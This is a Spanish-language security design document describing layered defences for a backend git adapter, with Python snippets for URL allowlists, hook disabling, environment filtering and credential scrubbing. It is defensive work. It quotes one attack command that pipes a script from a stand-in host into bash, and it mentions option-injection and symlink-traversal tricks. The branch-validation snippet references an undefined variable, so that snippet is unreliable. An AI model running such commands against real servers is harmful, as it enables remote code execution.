# Seguridad: Git

El adapter de git es la pieza **más expuesta** del backend. La URL del remoto y el token los manda el cliente. Sin las defensas que detallo abajo, un atacante con cuenta podría ejecutar comandos arbitrarios en el server.

## Threat model

- Cualquier dev autenticado puede triggear `commit`, `clone`, `push`.
- La URL del remoto en `clone`/`push` es controlada por el cliente.
- El token de credenciales es controlado por el cliente.
- El repo clonado contiene archivos arbitrarios elegidos por el cliente (potencialmente hooks, alternates, refs raros).

## Defensa 1: Allowlist positiva de URL schemes (BACKEND-AUDIT-0156)

**Ataque**: `ext::sh -c "curl evil.com | bash"` — git acepta este "URL" y ejecuta el comando arbitrario. CVE-2017-1000117 y familia.

**Mitigación**: allowlist positiva (no denylist):

```python
_URL_HTTPS = re.compile(r"^https?://[A-Za-z0-9._:-]+(/[^\s]*)?$")
_URL_GIT = re.compile(r"^git://[A-Za-z0-9._:-]+(/[^\s]*)?$")
_URL_SSH = re.compile(r"^ssh://(?:[A-Za-z0-9._-]+@)?[A-Za-z0-9._:-]+(/[^\s]*)?$")
_URL_SCP = re.compile(r"^[A-Za-z0-9._][A-Za-z0-9._-]*@[A-Za-z0-9._-]+:[A-Za-z0-9._/-]+$")
_URL_LOCAL = re.compile(r"^(?:file://)?(/|\./)[A-Za-z0-9._/-]+$")

def _url_segura(url, *, permitir_local=True):
    u = (url or "").strip()
    if not u or u.startswith("-"):
        return False
    if _URL_HTTPS.match(u) or _URL_GIT.match(u) or _URL_SSH.match(u):
        return True
    if _URL_SCP.match(u):
        return True
    if permitir_local and _URL_LOCAL.match(u) and ".." not in u:
        return True
    return False
```

Antes era denylist (`ext::`/`fd::`) — dependía de que el git del host estuviera parcheado. Con allowlist positiva: si no matchea uno de los 5 regex, se rechaza. Más seguro: si CVE nueva sale, ni nos enteramos.

Casos cubiertos:

- **HTTPS/HTTP estricto**: no acepta `--upload-pack=...` como user (el `[A-Za-z0-9._:-]+` no permite `=`).
- **SCP-like estricto**: user/host sin opciones git. CVE-2017-1000117 funcionaba porque git aceptaba `-oProxyCommand` como user.
- **Local**: solo para tests y siembra de workspace. `clonar(permitir_local=True)`, `push(permitir_local=False)`.

`-` al inicio rechazado: protege contra que `url` se interprete como flag.

### Anti-traversal en URL local

`_url_segura` rechaza CUALQUIER `..` en URL local:

```python
if permitir_local and _URL_LOCAL.match(u) and ".." not in u:
    return True
```

Sin esto: `file:///foo/../etc/passwd` o `/a/b/../../etc` se rechazan aunque el regex acepte. Defensa en profundidad — git resuelve la ruta canónica pero no contamos con eso.

## Defensa 2: Allowlist de transporte git

```python
_GIT_ENV_SEGURO = {
    "GIT_TERMINAL_PROMPT": "0",
    "GIT_ALLOW_PROTOCOL": "file:git:http:https:ssh:ftp:ftps",
    "GIT_PROTOCOL_FROM_USER": "0",
}
_GIT_CONF_SEGURO = [
    "-c", "protocol.ext.allow=never",
    "-c", "protocol.fd.allow=never",
    ...
]
```

**Doble defensa contra `ext::`/`fd::`**: el regex los rechaza Y git tiene órdenes explícitas de no permitirlos aunque pasaran.

## Defensa 3: Hooks deshabilitados (BACKEND-AUDIT-0153)

**Ataque**: el atacante mantiene un repo con `.git/hooks/pre-commit` malicioso. Cuando un dev del equipo `clone`a su repo y luego `commit`ea, el hook ejecuta con privilegios del server.

**Mitigación dual**:

1. **`core.hooksPath=/dev/null`** en `_GIT_CONF_SEGURO`: git busca hooks en `/dev/null` (vacío). Aplica en clone, commit, merge, etc.
2. **Purga de `.git/hooks/` post-clone**:

```python
hooks = destino / ".git" / "hooks"
if hooks.is_dir():
    shutil.rmtree(hooks, ignore_errors=True)
    hooks.mkdir(exist_ok=True)
```

Aunque `core.hooksPath=/dev/null` ya los neutraliza, los borramos también. Si un `git -c` futuro pierde ese override, los hooks siguen sin existir.

## Defensa 4: Env filtrado (BACKEND-AUDIT-0152)

**Ataque**: aunque hooks están deshabilitados, un comando git puede leakear env vars via stderr/stdout (`pre-receive` que falla y printa `env`). Si el subprocess git ve `STRIPE_SECRET_KEY`, `ORUX_*`, DSN de Postgres, etc., un atacante puede exfiltrarlos.

**Mitigación**: env por allowlist, no `**os.environ`:

```python
_ENV_ALLOWLIST = {
    "PATH", "HOME", "USER", "LOGNAME", "TMPDIR",
    "LANG", "LC_ALL", "LC_CTYPE", "LC_MESSAGES",
    "SSH_AUTH_SOCK", "SSH_AGENT_PID",
    "SSL_CERT_FILE", "SSL_CERT_DIR",
}

def _env_seguro(extra=None):
    base = {}
    for k, v in os.environ.items():
        if k in _ENV_ALLOWLIST or k.startswith("GIT_"):
            base[k] = v
    base.update(_GIT_ENV_SEGURO)
    if extra: base.update(extra)
    return base
```

- **Solo allowlist + `GIT_*` del host**: nada de `ORUX_*`, `STRIPE_*`, DSN.
- **Sobreescribe con `_GIT_ENV_SEGURO`**: forzar `GIT_TERMINAL_PROMPT=0` aunque el host lo tenga seteado distinto.
- **Permite `extra`**: para inyectar `GIT_ASKPASS` y `ORUX_GIT_USER`/`ORUX_GIT_TOKEN` (efímeros, solo durante la operación).

## Defensa 5: Credenciales efímeras vía `GIT_ASKPASS`

El secreto va SOLO en el env del subprocess, NO en argv (`ps` lo vería), NO en URL (`.git/config` lo guarda), NO en `credential.helper` (no cachea).

```python
_ASKPASS = (
    "#!/bin/sh\n"
    'case "$1" in\n'
    '  *[Uu]sername*) printf "%s" "$ORUX_GIT_USER" ;;\n'
    '  *) printf "%s" "$ORUX_GIT_TOKEN" ;;\n'
    "esac\n"
)
```

**El script NO contiene el secreto** — lo lee del env. Se crea en un dir 0700 (`tempfile.mkdtemp`), permisos 0700, nombre único `orux-askpass-<pid>-<uuid>.sh`; se borra en `finally`.

`git -c "credential.helper="` vacío fuerza a git a NO cachear las credenciales.

## Defensa 6: Tmpdir seguro para clone (BACKEND-AUDIT-0154, -0155)

**Sin esto**: clone iría a `/tmp/orux-clone-XXX/`. Problemas:

- Otro proceso del host puede leerlo durante la ventana.
- Cross-filesystem move (de `/tmp` a `/data/ws/`) = copia + delete, NO atómico.

**Mitigación**: tmpdir HERMANO del workspace:

```python
base = self._root.parent  # /data/ws/<team_id>/.. = /data/ws/
tmp = Path(tempfile.mkdtemp(prefix="orux-clone-", dir=str(base)))
os.chmod(tmp, 0o700)
```

- Mismo volumen ⇒ `shutil.move` interno es atómico.
- Mismo dueño/permisos del workspace.
- 0700: nadie más lee.

## Defensa 7: Anti-traversal en el rename de clone (BACKEND-AUDIT-0157)

Cuando reemplazamos el workspace con el contenido del clon, validamos que cada hijo del clon esté DENTRO del clon real:

```python
for hijo in destino.iterdir():
    try:
        if hijo.is_symlink():
            target = (hijo.parent / os.readlink(hijo)).resolve()
        else:
            target = hijo.resolve()
        if not str(target).startswith(str(destino_real)):
            logger.warning("clone: entry '%s' escapaba el repo, omitido", hijo.name)
            continue
    except OSError:
        continue
    shutil.move(str(hijo), str(self._root / hijo.name))
```

- **Symlinks intra-repo se permiten** (apuntan relativos dentro del tree).
- **Symlinks que apuntan fuera del clon se omiten** (no se mueven al workspace final).

Sin esto, un repo malicioso podría tener `symlink → /etc/passwd` y el move lo movería al workspace, donde un cliente legítimo lo "vería" como archivo del proyecto.

## Defensa 8: Cleanup de huérfanos en `/tmp` (BACKEND-AUDIT-0229)

Proceso muerto a mitad de clone deja `orux-clone-*` en `/tmp` huérfano. Tras meses, `/tmp` se llena.

`_limpiar_clones_huerfanos(ttl_horas=24)` corre al import del módulo (best-effort):

```python
def _limpiar_clones_huerfanos(ttl_horas=24.0):
    tmp = Path(tempfile.gettempdir())
    corte = time.time() - ttl_horas * 3600
    for hijo in tmp.iterdir():
        if not hijo.name.startswith("orux-clone-"):
            continue
        try:
            if hijo.stat().st_mtime < corte:
                shutil.rmtree(hijo, ignore_errors=True)
        except OSError:
            pass
```

Solo borra los con `mtime > 24h`. No revisa pid vivo (caro y race-prone) — basta con que sean viejos.

## Defensa 9: Validación del nombre de rama (BACKEND-AUDIT-0156)

```python
_RAMA_OK = re.compile(r"^[A-Za-z0-9._/-]+$")

def _rama_segura(rama):
    return (
        bool(r)
        and not r.startswith("-")
        and ".." not in r
        and bool(_RAMA_OK.match(r))
    )
```

- **No empieza con `-`**: el `rama` no se trata como opción de git (`-D rama` borraría).
- **No `..`**: refspecs raros (`HEAD..rama`).
- **Solo `[A-Za-z0-9._/-]`**: sin shell chars, sin spaces.

Aplicado en `push(rama=...)` y `push_a_rama(rama)`.

## Defensa 10: Validación del mensaje de commit (BACKEND-AUDIT-0158)

```python
_MAX_COMMIT_MSG = 8192
_AUTOR_OK = re.compile(r"^[\w .'+,_-]+$", re.UNICODE)
_EMAIL_OK = re.compile(r"^[^\s<>@]+@[^\s<>@]+\.[^\s<>@]+$")

def _validar_commit(mensaje, autor_nombre, autor_email):
    if not mensaje.strip():
        return "el mensaje no puede estar vacío"
    if len(mensaje) > _MAX_COMMIT_MSG:
        return f"mensaje demasiado largo (>{_MAX_COMMIT_MSG} bytes)"
    if "\0" in mensaje:
        return "mensaje con caracteres no permitidos"
    # ... autor, email
```

- **Tope 8 KB**: sin esto, un commit puede traer 8 MB que git acepta.
- **Sin `\x00`**: corta argv en C.
- **Sin `\n` en autor**: rompe el formato `Author: <name> <email>`.

## Defensa 11: Scrubbing de salida (BACKEND-AUDIT-0161)

Cualquier mensaje que el cliente o el log reciban está scrubeado:

```python
_URL_CON_CRED = re.compile(r"(https?://)([^:@/\s]+):([^@/\s]+)@")

def _scrubear(texto, token=None):
    if not texto: return texto
    out = texto
    if token and len(token) >= 8:
        out = out.replace(token, "***")
    out = _URL_CON_CRED.sub(r"\1\2:***@", out)
    return out
```

- **Token literal**: ya cubre el caso normal (token directo en error).
- **URLs con credenciales embebidas**: git imprime `https://user:token@host` en algunos errores.

**Conservadores con el regex de tokens-like**: NO scrubeamos secuencias largas aleatorias (rompía paths de pytest legítimos y mensajes de error del usuario). Solo lo literal + URLs.

## Defensa 12: Timeouts separados (BACKEND-AUDIT-0159, -0263)

```python
_GIT_TIMEOUT_LOCAL = clamp(_env_int("ORUX_GIT_TIMEOUT_LOCAL", 10), min=5)
_GIT_TIMEOUT_REMOTO = clamp(_env_int("ORUX_GIT_TIMEOUT", 120), min=5)
_OPS_REMOTAS = {"fetch", "clone", "push", "pull", "ls-remote"}

def _timeout_para(op):
    return _GIT_TIMEOUT_REMOTO if op in _OPS_REMOTAS else _GIT_TIMEOUT_LOCAL
```

`status`/`log`/`add`/`commit` son <1s. Sin separar, un `status` colgado bloqueaba el threadpool por el timeout remoto (120s).

Clamp ≥5s para que `ORUX_GIT_TIMEOUT=0`/`-1` no rompan.

## Lección general

Cuando algo es **vulnerable por construcción** (URL del cliente, token del cliente, repo arbitrario), las defensas se acumulan:

1. **Validar la entrada** (URL allowlist, rama allowlist, mensaje commit).
2. **Restringir las capacidades** (`GIT_ALLOW_PROTOCOL`, `core.hooksPath`, `credential.helper=`).
3. **Aislar el subprocess** (env allowlist, sin shell, argv directo).
4. **Manejar el secreto fuera de banda** (askpass temporal).
5. **Defensa en profundidad** (scrubbing, anti-traversal en rename, purga de hooks aunque hooksPath esté).

Ninguna defensa sola es suficiente. La combinación es lo que hace seguro al producto. Si una capa falla por un CVE nuevo, las otras atrapan.

## Tests

`backend/tests/test_git.py` cubre:

- `_url_segura` con cada patrón (válidos + rechazados).
- `_rama_segura`.
- `_validar_commit`.
- `_scrubear`.
- Atomic write (clone a tmp, replace solo si OK).
- Anti-traversal en rename.
- Cleanup de tmps.

Tests marcados con `@pytest.mark.integration` (lentos): ejercitan git real con repos sintéticos en tmp_path.
